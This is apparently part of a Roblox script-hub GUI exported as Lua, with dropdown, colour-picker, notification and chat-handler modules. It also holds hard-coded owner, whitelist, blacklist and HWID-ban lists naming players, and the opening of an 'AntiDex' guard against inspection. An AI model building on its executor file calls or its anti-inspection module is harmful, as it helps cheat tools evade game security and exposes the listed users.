		if cachedThumbs[userId] then return cachedThumbs[userId] end
		local ok, img = pcall(function()
			return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
		end)
		local result = ok and img or ""
		cachedThumbs[userId] = result
		return result
	end
	local currentOpenDropdown = nil
	local function CreateDropdown(config)
		local frameName = config.frame
		local groupboxScript = config.groupbox
		local tooltipText = config.tooltip
		local callback = config.callback
		local dropdownType = config.dropdowntype or "custom"
		local customList = config.customlist or {}
		local multiSelect = config.multiselect or false
		local maxMultiSelect = config.maxmultiselect
		local maxVisible = config.max
		local hasSearchbar = config.searchbar or false
		local playerIcon = config.playericon or false
		local defaultSelection = config.defaultselection
		local showSelectAll = config.showselectall or false
		local showUserButtons = config.showuserbuttons or false
		local frame = groupboxScript.Parent:FindFirstChild(frameName)
		if not frame then return end
		local button = frame:FindFirstChild("button")
		if not button then return end
		local dropdownFrame = button:FindFirstChild("dropdownFrame")
		local search = button:FindFirstChild("search")
		local arrow = button:FindFirstChild("arrow")
		local text = button:FindFirstChild("text")
		local outlineStroke = dropdownFrame and dropdownFrame:FindFirstChild("outlineStroke", true)
		if not dropdownFrame or not search or not arrow or not text then return end
		local dropdownList = screenGui:FindFirstChild("Dropdown")
		if not dropdownList then return end
		local dropdownScrolling = dropdownList:FindFirstChild("dropdownScrolling")
		if not dropdownScrolling or not dropdownScrolling:IsA("ScrollingFrame") then return end
		local buttonTemplate = dropdownScrolling:FindFirstChild("button")
		if not buttonTemplate then return end
		local dropdownSelectAll = dropdownList:FindFirstChild("dropdownSelectAll")
		local selectAllBtn = dropdownSelectAll and dropdownSelectAll:FindFirstChild("selectall")
		local unselectAllBtn = dropdownSelectAll and dropdownSelectAll:FindFirstChild("unselectall")
		local dropdownUsers = dropdownList:FindFirstChild("dropdownUsers")
		local displayBtn = dropdownUsers and dropdownUsers:FindFirstChild("display")
		local friendsBtn = dropdownUsers and dropdownUsers:FindFirstChild("friends")
		local uiListLayout = dropdownScrolling:FindFirstChild("UIListLayout")
		if not uiListLayout then
			uiListLayout = Instance.new("UIListLayout")
			uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
			uiListLayout.Parent = dropdownScrolling
		end
		local isOpen = false
		local selectedItems = {}
		local selectedSingle = nil
		local originalText = text.Text
		local showDisplayNames = false
		local showFriendsOnly = false
		local configKey = frameName
		if _G.ConfigData[configKey] then
			if multiSelect then
				selectedItems = _G.ConfigData[configKey]
			else
				selectedSingle = _G.ConfigData[configKey]
			end
		elseif defaultSelection then
			if defaultSelection == "none" then
				selectedSingle = nil
				text.Text = "--"
			elseif dropdownType == "custom" and not multiSelect then
				selectedSingle = defaultSelection
				_G.ConfigData[configKey] = defaultSelection
				saveConfig()
			end
		end
		local function updateText()
			if multiSelect then
				local count = 0
				local names = {}
				for item, _ in pairs(selectedItems) do
					count = count + 1
					table.insert(names, item)
				end
				if count == 0 then
					if defaultSelection == "none" then
						text.Text = "--"
					else
						text.Text = originalText
					end
				else
					local combined = table.concat(names, ", ")
					local testLabel = text:Clone()
					testLabel.Text = combined
					testLabel.Parent = text.Parent
					if testLabel.TextFits then
						text.Text = combined
					else
						text.Text = count .. (dropdownType == "players" and " Players Selected" or " Selected")
					end
					testLabel:Destroy()
				end
			else
				if selectedSingle then
					text.Text = selectedSingle
				else
					if defaultSelection == "none" then
						text.Text = "--"
					else
						text.Text = originalText
					end
				end
			end
		end
		local function updateDropdownPosition()
			local absPos = dropdownFrame.AbsolutePosition
			local absSize = dropdownFrame.AbsoluteSize
			dropdownList.Position = UDim2.new(0, absPos.X, 0, absPos.Y + absSize.Y)
			dropdownList.Size = UDim2.new(0, absSize.X, 0, dropdownList.Size.Y.Offset)
		end
		local function buildList(filter)
			for _, child in pairs(dropdownScrolling:GetChildren()) do
				if child.Name:match("^Option_") then
					child:Destroy()
				end
			end
			local itemList = {}
			if dropdownType == "players" then
				for _, player in pairs(Players:GetPlayers()) do
					if showFriendsOnly and not player:IsFriendsWith(Players.LocalPlayer.UserId) then
						continue
					end
					local displayName = showDisplayNames and player.DisplayName or player.Name
					if filter == "" or displayName:lower():find(filter:lower(), 1, true) then
						table.insert(itemList, {
							value = player.Name,
							display = displayName,
							userId = player.UserId,
							isPlayer = true
						})
					end
				end
			elseif dropdownType == "teams" then
				for _, team in pairs(Teams:GetTeams()) do
					local teamName = team.Name
					if filter == "" or teamName:lower():find(filter:lower(), 1, true) then
						table.insert(itemList, {
							value = teamName,
							display = teamName,
							isTeam = true
						})
					end
				end
			else
				for i, item in ipairs(customList) do
					if filter == "" or item:lower():find(filter:lower(), 1, true) then
						table.insert(itemList, {
							value = item,
							display = item,
							order = i
						})
					end
				end
			end
			local visibleCount = maxVisible and math.min(#itemList, maxVisible) or #itemList
			local buttonHeight = dropdownFrame.AbsoluteSize.Y
			local totalHeight = #itemList * buttonHeight
			local visibleHeight = visibleCount * buttonHeight
			dropdownScrolling.Size = UDim2.new(1, 0, 0, visibleHeight)
			dropdownScrolling.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
			for i, item in ipairs(itemList) do
				local optionButton = buttonTemplate:Clone()
				optionButton.Name = "Option_" .. i
				optionButton.Size = UDim2.new(1, 0, 0, buttonHeight)
				optionButton.LayoutOrder = item.order or i
				optionButton.Visible = true
				optionButton.ZIndex = 10
				local optionText = optionButton:FindFirstChild("text")
				local optionImage = optionButton:FindFirstChild("image")
				if optionText then
					optionText.Text = item.display
					local isSelected = multiSelect and selectedItems[item.value] or (selectedSingle == item.value)
					if isSelected then
						optionText.TextColor3 = targetColor
					end
				end
				if optionImage then
					if playerIcon and item.isPlayer then
						optionImage.Visible = true
						task.spawn(function()
							optionImage.Image = getThumb(item.userId)
						end)
					else
						optionImage.Visible = false
					end
				end
				local optionBtn = optionButton:IsA("TextButton") and optionButton or Instance.new("TextButton")
				if not optionButton:IsA("TextButton") then
					optionBtn.Size = UDim2.new(1, 0, 1, 0)
					optionBtn.BackgroundTransparency = 1
					optionBtn.Text = ""
					optionBtn.ZIndex = optionButton.ZIndex + 1
					optionBtn.Parent = optionButton
				end
				optionBtn.MouseEnter:Connect(function()
					optionButton.BorderColor3 = targetColor
					optionButton.ZIndex = 99
				end)
				optionBtn.MouseLeave:Connect(function()
					optionButton.BorderColor3 = Color3.fromRGB(50, 50, 50)
					optionButton.ZIndex = 10
				end)
				optionBtn.MouseButton1Click:Connect(function()
					if multiSelect then
						if selectedItems[item.value] then
							selectedItems[item.value] = nil
							if optionText then
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						else
							local count = 0
							for _ in pairs(selectedItems) do count = count + 1 end
							if not maxMultiSelect or count < maxMultiSelect then
								selectedItems[item.value] = true
								if optionText then
									optionText.TextColor3 = targetColor
								end
							end
						end
						updateText()
						_G.ConfigData[configKey] = selectedItems
						saveConfig()
						if callback then
							callback(selectedItems)
						end
					else
						for _, child in pairs(dropdownScrolling:GetChildren()) do
							if child.Name:match("^Option_") then
								local childText = child:FindFirstChild("text")
								if childText then
									childText.TextColor3 = Color3.fromRGB(255, 255, 255)
								end
							end
						end
						if selectedSingle == item.value then
							selectedSingle = nil
							if optionText then
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						else
							selectedSingle = item.value
							if optionText then
								optionText.TextColor3 = targetColor
							end
						end
						updateText()
						_G.ConfigData[configKey] = selectedSingle
						saveConfig()
						if callback then
							if dropdownType == "players" then
								local player = Players:FindFirstChild(item.value)
								callback(player)
							elseif dropdownType == "teams" then
								local team = Teams:FindFirstChild(item.value)
								callback(team)
							else
								callback(selectedSingle)
							end
						end
						isOpen = false
						dropdownList.Visible = false
						text.Visible = true
						search.Visible = false
						arrow.Visible = true
						dropdownFrame.Visible = true
						arrow.Rotation = 180
						currentOpenDropdown = nil
					end
				end)
				optionButton:SetAttribute("ItemValue", item.value)
				optionButton.Parent = dropdownScrolling
			end
			updateDropdownPosition()
		end
		local function openDropdown()
			if currentOpenDropdown and currentOpenDropdown ~= button then
				currentOpenDropdown.Click()
			end
			isOpen = true
			dropdownList.Visible = true
			arrow.Rotation = 0
			currentOpenDropdown = button
			if hasSearchbar then
				text.Visible = false
				search.Visible = true
				search.Text = ""
			end
			if dropdownSelectAll then
				dropdownSelectAll.Visible = showSelectAll
			end
			if dropdownUsers then
				dropdownUsers.Visible = showUserButtons and dropdownType == "players"
			end
			updateDropdownPosition()
			buildList("")
		end
		local function closeDropdown()
			isOpen = false
			dropdownList.Visible = false
			text.Visible = true
			search.Visible = false
			arrow.Visible = true
			dropdownFrame.Visible = true
			arrow.Rotation = 180
			if currentOpenDropdown == button then
				currentOpenDropdown = nil
			end
		end
		button.MouseButton1Click:Connect(function()
			if isOpen then
				if not hasSearchbar then
					closeDropdown()
				end
			else
				openDropdown()
			end
		end)
		arrow.MouseButton1Click:Connect(function()
			if isOpen then
				closeDropdown()
			else
				openDropdown()
			end
		end)
		if selectAllBtn then
			selectAllBtn.MouseButton1Click:Connect(function()
				if not isOpen then return end
				local currentItems = {}
				for _, child in pairs(dropdownScrolling:GetChildren()) do
					if child.Name:match("^Option_") then
						table.insert(currentItems, child)
					end
				end
				if multiSelect then
					for _, child in ipairs(currentItems) do
						local optionText = child:FindFirstChild("text")
						if optionText then
							local itemValue = child:GetAttribute("ItemValue") or optionText.Text
							selectedItems[itemValue] = true
							optionText.TextColor3 = targetColor
						end
					end
					updateText()
					_G.ConfigData[configKey] = selectedItems
					saveConfig()
					if callback then
						callback(selectedItems)
					end
				else
					if #currentItems > 0 then
						local firstChild = currentItems[1]
						local optionText = firstChild:FindFirstChild("text")
						if optionText then
							selectedSingle = firstChild:GetAttribute("ItemValue") or optionText.Text
							optionText.TextColor3 = targetColor
						end
						updateText()
						_G.ConfigData[configKey] = selectedSingle
						saveConfig()
						if callback then
							if dropdownType == "players" then
								local player = Players:FindFirstChild(selectedSingle)
								callback(player)
							elseif dropdownType == "teams" then
								local team = Teams:FindFirstChild(selectedSingle)
								callback(team)
							else
								callback(selectedSingle)
							end
						end
					end
				end
			end)
		end
		if unselectAllBtn then
			unselectAllBtn.MouseButton1Click:Connect(function()
				if not isOpen then return end
				if multiSelect then
					local itemsToRemove = {}
					for _, child in pairs(dropdownScrolling:GetChildren()) do
						if child.Name:match("^Option_") then
							local optionText = child:FindFirstChild("text")
							if optionText then
								local itemValue = child:GetAttribute("ItemValue") or optionText.Text
								table.insert(itemsToRemove, itemValue)
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						end
					end
					for _, itemValue in ipairs(itemsToRemove) do
						selectedItems[itemValue] = nil
					end
					updateText()
					_G.ConfigData[configKey] = selectedItems
					saveConfig()
					if callback then
						callback(selectedItems)
					end
				else
					selectedSingle = nil
					for _, child in pairs(dropdownScrolling:GetChildren()) do
						if child.Name:match("^Option_") then
							local optionText = child:FindFirstChild("text")
							if optionText then
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						end
					end
					updateText()
					_G.ConfigData[configKey] = nil
					saveConfig()
					if callback then
						callback(nil)
					end
				end
			end)
		end
		if displayBtn then
			displayBtn.MouseButton1Click:Connect(function()
				showDisplayNames = not showDisplayNames
				displayBtn.Text = showDisplayNames and "Show Username" or "Show Display"
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
		end
		if friendsBtn then
			friendsBtn.MouseButton1Click:Connect(function()
				showFriendsOnly = not showFriendsOnly
				friendsBtn.Text = showFriendsOnly and "Show All" or "Friends Only"
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
		end
		if hasSearchbar then
			search:GetPropertyChangedSignal("Text"):Connect(function()
				if isOpen then
					buildList(search.Text)
				end
			end)
		end
		dropdownFrame:GetPropertyChangedSignal("AbsolutePosition"):Connect(function()
			if isOpen then
				updateDropdownPosition()
			end
		end)
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
			button.MouseEnter:Connect(function()
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
			button.MouseLeave:Connect(function()
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = originalThickness
				outlineStroke.Transparency = originalTransparency
				outlineStroke.ZIndex = 1
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
		if dropdownType == "players" then
			Players.PlayerAdded:Connect(function()
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
			Players.PlayerRemoving:Connect(function(player)
				if multiSelect and selectedItems[player.Name] then
					selectedItems[player.Name] = nil
					updateText()
					_G.ConfigData[configKey] = selectedItems
					saveConfig()
				elseif selectedSingle == player.Name then
					selectedSingle = nil
					updateText()
					_G.ConfigData[configKey] = nil
					saveConfig()
				end
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
		end
		text.Visible = true
		search.Visible = false
		arrow.Visible = true
		dropdownFrame.Visible = true
		arrow.Rotation = 180
		dropdownList.Visible = false
		buttonTemplate.Visible = false
		if dropdownSelectAll then
			dropdownSelectAll.Visible = false
		end
		if dropdownUsers then
			dropdownUsers.Visible = false
		end
		updateText()
	end
	_G.CreateDropdown = CreateDropdown
end;
task.spawn(C_2be);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ColorPickerMaster
local function C_2bf()
local script = G2L["2bf"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	
	_G.ConfigData = _G.ConfigData or {}
	
	local CONFIG_FILE = "myconfig.json"
	
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	
	loadConfig()
	
	local mainColorPicker = screenGui:FindFirstChild("ColorPicker")
	if not mainColorPicker then return end
	
	local activePickerButton = nil
	local activeConfigKey = nil
	local activeCallback = nil
	local activeButtonColorFrame = nil
	local activeButtonStroke = nil
	
	local function CreateColorPicker(config)
		local frameName = config.frame
		local colorPickerFrameName = config.colorpickerframe
		local tooltipText = config.tooltip
		local defaultColor = config.default
		local titleText = config.title
		local alphaEnabled = config.alpha ~= false
		local defaultAlpha = config.defaultalpha or 0
		local callback = config.callback
	
		local groupboxFrame = config.groupbox.Parent
		local frame = groupboxFrame:FindFirstChild(frameName)
		if not frame then return end
	
		local pickerButton = frame:FindFirstChild(colorPickerFrameName)
		if not pickerButton then return end
	
		local buttonColorFrame = pickerButton:FindFirstChild("colorFrame")
		if not buttonColorFrame then return end
	
		local buttonStroke = buttonColorFrame:FindFirstChild("UIStroke")
	
		-- Determine default color
		local startColor = Color3.fromRGB(255, 255, 255)
		if defaultColor == "frameColor" then
			startColor = targetColor
		elseif type(defaultColor) == "string" then
			local r, g, b = defaultColor:match("(%d+),%s*(%d+),%s*(%d+)")
			if r and g and b then
				startColor = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
			end
		elseif typeof(defaultColor) == "Color3" then
			startColor = defaultColor
		end
	
		-- Config key
		local configKey = frameName .. "_" .. colorPickerFrameName
	
		-- Load saved color from config
		if _G.ConfigData[configKey] then
			local saved = _G.ConfigData[configKey]
			startColor = Color3.fromRGB(saved.r, saved.g, saved.b)
			defaultAlpha = saved.a or defaultAlpha
		end
	
		-- Set initial button color
		buttonColorFrame.BackgroundColor3 = startColor
		if buttonStroke then
			buttonStroke.Color = startColor
		end
	
		-- Set title
		if titleText then
			local titleLabel = mainColorPicker.innerframelayout:FindFirstChild("text")
			if titleLabel then
				titleLabel.Text = titleText
			end
		end
	
		-- Hide/show transparency
		local transparencyFrame = mainColorPicker.innerframelayout:FindFirstChild("transparency")
		if transparencyFrame then
			transparencyFrame.Visible = alphaEnabled
		end
	
		-- Position picker under button or center
		local function positionPicker()
			if _G.CenterColorPicker then
				-- Center on screen
				local screenSize = screenGui.AbsoluteSize
				local pickerSize = mainColorPicker.AbsoluteSize
				mainColorPicker.Position = UDim2.new(0, (screenSize.X - pickerSize.X) / 2, 0, (screenSize.Y - pickerSize.Y) / 2)
			else
				-- Position under button
				local isRightside = groupboxFrame.Name:lower():find("right")
				local buttonPos = pickerButton.AbsolutePosition
				local buttonSize = pickerButton.AbsoluteSize
				local pickerSize = mainColorPicker.AbsoluteSize
	
				if isRightside then
					mainColorPicker.Position = UDim2.new(0, buttonPos.X + buttonSize.X - pickerSize.X, 0, buttonPos.Y + buttonSize.Y)
				else
					mainColorPicker.Position = UDim2.new(0, buttonPos.X, 0, buttonPos.Y + buttonSize.Y)
				end
			end
		end
	
		-- Click button to open/close picker
		local RunService = game:GetService("RunService")
		local updateConnection = nil
	
		pickerButton.MouseButton1Click:Connect(function()
			if mainColorPicker.Visible and activePickerButton == pickerButton then
				-- Close (act as cancel)
				mainColorPicker.Visible = false
				activePickerButton = nil
				if updateConnection then
					updateConnection:Disconnect()
					updateConnection = nil
				end
			else
				-- Open
				positionPicker()
				mainColorPicker.Visible = true
				activePickerButton = pickerButton
	
				-- Store active picker data
				activeConfigKey = configKey
				activeCallback = callback
				activeButtonColorFrame = buttonColorFrame
				activeButtonStroke = buttonStroke
	
				-- Update title
				if titleText then
					local titleLabel = mainColorPicker.innerframelayout:FindFirstChild("text")
					if titleLabel then
						titleLabel.Text = titleText
					end
				end
	
				-- Update transparency visibility
				local transparencyFrame = mainColorPicker.innerframelayout:FindFirstChild("transparency")
				if transparencyFrame then
					transparencyFrame.Visible = alphaEnabled
					if alphaEnabled then
						mainColorPicker.Size = UDim2.new(0, 200, 0, 270)
					else
						mainColorPicker.Size = UDim2.new(0, 200, 0, 252)
					end
				end
	
				-- Continuously update position while open
				if updateConnection then
					updateConnection:Disconnect()
				end
				updateConnection = RunService.RenderStepped:Connect(function()
					if mainColorPicker.Visible and activePickerButton == pickerButton then
						positionPicker()
					else
						if updateConnection then
							updateConnection:Disconnect()
							updateConnection = nil
						end
					end
				end)
	
				-- Set picker to current button color
				if _G.SetColorPickerColor then
					_G.SetColorPickerColor(buttonColorFrame.BackgroundColor3, defaultAlpha)
				end
			end
		end)
	
		-- Tooltip
		if tooltipText then
			pickerButton.MouseEnter:Connect(function()
				if _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
			pickerButton.MouseLeave:Connect(function()
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	
	_G.CreateColorPicker = CreateColorPicker
	
	-- Apply button (connected ONCE for all colorpickers)
	local applyButton = mainColorPicker.innerframelayout.applycancel.apply
	applyButton.MouseButton1Click:Connect(function()
		if not activePickerButton then return end
	
		if _G.GetColorPickerColor then
			local selectedColor, selectedAlpha = _G.GetColorPickerColor()
	
			if activeButtonColorFrame then
				activeButtonColorFrame.BackgroundColor3 = selectedColor
				activeButtonColorFrame.BackgroundTransparency = 0
			end
			if activeButtonStroke then
				activeButtonStroke.Color = selectedColor
			end
	
			if activeConfigKey then
				_G.ConfigData[activeConfigKey] = {
					r = math.floor(selectedColor.R * 255),
					g = math.floor(selectedColor.G * 255),
					b = math.floor(selectedColor.B * 255),
					a = selectedAlpha
				}
				saveConfig()
			end
	
			if activeCallback then
				activeCallback(selectedColor, selectedAlpha)
			end
	
			mainColorPicker.Visible = false
			activePickerButton = nil
		end
	end)
	
	-- Cancel button (connected ONCE for all colorpickers)
	local cancelButton = mainColorPicker.innerframelayout.applycancel.cancel
	cancelButton.MouseButton1Click:Connect(function()
		if not activePickerButton then return end
	
		mainColorPicker.Visible = false
		activePickerButton = nil
	end)
end;
task.spawn(C_2bf);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ChatMaster
local function C_2c0()
local script = G2L["2c0"];
	-- ChatMaster Script (put in Gui.MasterScripts.ChatMaster)
	local Players = game:GetService("Players")
	local TextChatService = game:GetService("TextChatService")
	
	_G.ChatHandlers = _G.ChatHandlers or {}
	
	TextChatService.OnIncomingMessage = function(mdata)
		local plr = mdata.TextSource
			and mdata.TextSource.UserId
			and Players:GetPlayerByUserId(mdata.TextSource.UserId)
	
		if not plr then return end
	
		-- Call all registered handlers
		for _, handler in ipairs(_G.ChatHandlers) do
			pcall(function()
				handler(mdata, plr)
			end)
		end
	end
end;
task.spawn(C_2c0);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.UserList
local function C_2c1()
local script = G2L["2c1"];
	-- UserListMaster Script (put in Gui.MasterScripts)
	_G.UserLists = {
		Blacklisted = {
			1535622508, -- Buildermann
			3590692150, -- DeLight
			1704747, -- snips
			3234700453, -- Box_boy56433
			10385488328, -- Ihateroblox_oq
			5695584804, -- strongestegg83973
			10923596100, -- serverbot_tco
			4393801944, -- gelato
		},
		Whitelisted = {
			10754470202, -- raja 22
			10642124279, -- raja 21
			8008797519, -- phan main
			10840760745, -- phan einstein
			2735168711, -- slime 2
			3492744393, -- slime
			909205143, -- pop
			7999975433, -- koi
			10946974452, -- korea
		},
		Owners = {
			574381128,   -- main
			10587072700, -- ryansocoool
			8308247571,  -- bobby2 agarv_bbc
			10837544781, -- agarv609
			10842814389, -- MONKEYARMPIT6
		},
		HWIDBanned = {
			-- Add HWIDs here
		}
	}
	-- Helper functions
	function _G.IsBlacklisted(userId)
		for _, id in ipairs(_G.UserLists.Blacklisted) do
			if userId == id then
				return true
			end
		end
		return false
	end
	function _G.IsWhitelisted(userId)
		for _, id in ipairs(_G.UserLists.Whitelisted) do
			if userId == id then
				return true
			end
		end
		return false
	end
	function _G.IsOwner(userId)
		for _, id in ipairs(_G.UserLists.Owners) do
			if userId == id then
				return true
			end
		end
		return false
	end
	function _G.IsHWIDBanned(hwid)
		for _, id in ipairs(_G.UserLists.HWIDBanned) do
			if hwid == id then
				return true
			end
		end
		return false
	end
end;
task.spawn(C_2c1);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.MAINCALLS
local function C_2c2()
local script = G2L["2c2"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	shared.ResetCharacter = function()
		if LocalPlayer.Character then
			LocalPlayer.Character:BreakJoints()
		end
	end
end;
task.spawn(C_2c2);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.Notif
local function C_2c3()
local script = G2L["2c3"];
	-- Notification System (FIXED REPOSITIONING + UNLIMITED STACKING + CUSTOM SFX)
	local function getScreenGuiForNotif()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local notifScreenGui = getScreenGuiForNotif()
	if not notifScreenGui then return end
	
	-- Get the accent color from your Color frame
	local colorFrame = notifScreenGui:FindFirstChild("Color")
	local notifTargetColor = colorFrame and colorFrame.BackgroundColor3 or Color3.fromRGB(0, 124, 255)
	
	local NotificationSystem = {}
	local TweenService = game:GetService("TweenService")
	local TextService = game:GetService("TextService")
	
	local activeNotifications = {}
	
	local function repositionNotifications()
		local yOffset = 0.02
		for i, notifData in ipairs(activeNotifications) do
			if notifData.frame and notifData.frame.Parent then
				TweenService:Create(notifData.frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(0, 10, yOffset, 0)
				}):Play()
	
				-- Calculate gap based on notification height
				local notifHeight = notifData.frame.AbsoluteSize.Y
				local screenHeight = notifScreenGui.AbsoluteSize.Y
				local heightOffset = notifHeight / screenHeight
	
				yOffset = yOffset + heightOffset + 0.005 -- 0.005 = small gap between notifications
			end
		end
	end
	
	function NotificationSystem:Notify(text, duration, soundId)
		if not notifScreenGui then return end
	
		duration = duration or 5
		soundId = soundId or nil
	
		-- Update color in case it changed
		if colorFrame then
			notifTargetColor = colorFrame.BackgroundColor3
		end
	
		-- Play sound if provided
		if soundId then
			-- Preload the sound first
			local preloadSound = Instance.new("Sound")
			preloadSound.SoundId = "rbxassetid://" .. tostring(soundId)
			preloadSound.Volume = 0
			preloadSound.Parent = game:GetService("SoundService")
	
			local loaded = false
			preloadSound.Loaded:Connect(function()
				loaded = true
			end)
	
			-- Wait for it to load (max 0.5 seconds)
			local startTime = tick()
			while not loaded and (tick() - startTime) < 0.5 do
				task.wait()
			end
	
			preloadSound:Destroy()
	
			-- Now play the actual sound
			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://" .. tostring(soundId)
			sound.Volume = 0.5
			sound.Parent = game:GetService("SoundService")
			sound:Play()
	
			sound.Ended:Connect(function()
				sound:Destroy()
			end)
		end
	
		-- Calculate text size with wrapping
		local maxWidth = 350
		local textBounds = TextService:GetTextSize(
			text,
			12,
			Enum.Font.Code,
			Vector2.new(maxWidth - 14, math.huge)
		)
	
		local width = math.max(100, math.min(textBounds.X + 14, maxWidth))
		local height = math.max(20, textBounds.Y + 4)
	
		-- Create notification frame
		local notif = Instance.new("Frame")
		notif.Name = "Notif"
		notif.ZIndex = 1000000009
		notif.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
		notif.BorderMode = Enum.BorderMode.Inset
		notif.Size = UDim2.new(0, width, 0, height)
		notif.BorderColor3 = Color3.fromRGB(51, 51, 51)
		notif.Parent = notifScreenGui
	
		-- Initial position (will be repositioned)
		notif.Position = UDim2.new(0, 10, 0.02, 0)
	
		-- Fade canvas group
		local notifFade = Instance.new("CanvasGroup")
		notifFade.Name = "notifFade"
		notifFade.BorderSizePixel = 0
		notifFade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		notifFade.Size = UDim2.new(1, 0, 1, 0)
		notifFade.Parent = notif
	
		local gradient = Instance.new("UIGradient")
		gradient.Rotation = 90
		gradient.Transparency = NumberSequence.new{
			NumberSequenceKeypoint.new(0.000, 1),
			NumberSequenceKeypoint.new(1.000, 0.7)
		}
		gradient.Parent = notifFade
	
		-- Text label
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "text"
		textLabel.TextWrapped = true
		textLabel.ZIndex = 999999999
		textLabel.BorderSizePixel = 0
		textLabel.TextSize = 12
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.TextYAlignment = Enum.TextYAlignment.Center
		textLabel.BackgroundTransparency = 1
		textLabel.Font = Enum.Font.Code
		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.Text = text
		textLabel.Parent = notif
	
		local textStroke = Instance.new("UIStroke")
		textStroke.Parent = textLabel
	
		local padding = Instance.new("UIPadding")
		padding.PaddingLeft = UDim.new(0, 7)
		padding.PaddingRight = UDim.new(0, 2)
		padding.Parent = textLabel
	
		local uiScale = Instance.new("UIScale")
		uiScale.Scale = 0
		uiScale.Parent = notif
	
		local outlineStroke = Instance.new("UIStroke")
		outlineStroke.Parent = notif
	
		-- Accent color bar
		local guiColor = Instance.new("Frame")
		guiColor.Name = "GuiColor"
		guiColor.ZIndex = 999999999
		guiColor.BorderSizePixel = 0
		guiColor.BackgroundColor3 = notifTargetColor
		guiColor.Size = UDim2.new(0, 2, 1, 0)
		guiColor.Parent = notif
	
		-- Add to active list
		local notifData = {frame = notif}
		table.insert(activeNotifications, notifData)
	
		-- Reposition all notifications
		repositionNotifications()
	
		-- Animate in
		TweenService:Create(uiScale, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
			Scale = 1
		}):Play()
	
		-- Auto-destroy after duration
		task.delay(duration, function()
			TweenService:Create(uiScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
				Scale = 0
			}):Play()
	
			task.wait(0.2)
	
			-- Remove from active list
			for i, n in pairs(activeNotifications) do
				if n == notifData then
					table.remove(activeNotifications, i)
					break
				end
			end
	
			notif:Destroy()
	
			-- Reposition remaining notifications
			repositionNotifications()
		end)
	end
	
	_G.Notify = function(text, duration, soundId)
		NotificationSystem:Notify(text, duration, soundId)
	end
end;
task.spawn(C_2c3);
-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AntiDex
local function C_2c5()
local script = G2L["2c5"];
	-- GUI Protection Script
	-- Place this at the top of your main script
	-- Cancel if running in Studio
	if game:GetService("RunService"):IsStudio() then
		return
	end
	
	local Players = game:GetService("Players")
	local CoreGui = game:GetService("CoreGui")
	local LocalPlayer = Players.LocalPlayer
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	
	-- Find the ScreenGui
	local function getScreenGui()
		local p = script.Parent
		while p do
